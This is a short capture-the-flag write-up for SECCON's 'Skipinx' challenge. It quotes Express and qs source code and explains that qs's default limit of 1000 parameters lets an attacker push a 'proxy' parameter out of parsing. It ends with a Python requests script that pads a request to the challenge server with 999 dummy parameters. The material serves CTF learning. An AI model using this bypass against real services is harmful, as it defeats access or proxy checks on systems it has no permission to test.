# Skipinx Writeup

## Intro

Let's check express's req.query middleware source code:

```javascript
function query(options) {
  var opts = merge({}, options)
  var queryparse = qs.parse;

  if (typeof options === 'function') {
    queryparse = options;
    opts = undefined;
  }

  if (opts !== undefined && opts.allowPrototypes === undefined) {
    // back-compat for qs module
    opts.allowPrototypes = true;
  }

  return function query(req, res, next){
    if (!req.query) {
      var val = parseUrl(req).query;
      req.query = queryparse(val, opts);
    }

    next();
  };
};
```

We can see, that qs are used for get parameters parsing by default


In qs parser source code we can find folowing lines: 

```javascript
var defaults = {
    allowDots: false,
    allowPrototypes: false,
    allowSparse: false,
    arrayLimit: 20,
    charset: 'utf-8',
    charsetSentinel: false,
    comma: false,
    decoder: utils.decode,
    delimiter: '&',
    depth: 5,
    ignoreQueryPrefix: false,
    interpretNumericEntities: false,
    parameterLimit: 1000,
    parseArrays: true,
    plainObjects: false,
    strictNullHandling: false
};
```

This is default settings for parser and parameter limit set to 1000.

## Attacking

We can send more than 1000 parameter and proxy parameter will be ignored


```python
import requests as rq

params = {str(x): x for x in range(999)}
params['proxy'] = 'proxy'
r = rq.get('http://skipinx.seccon.games:8080', params=params)
print(r.text)
```

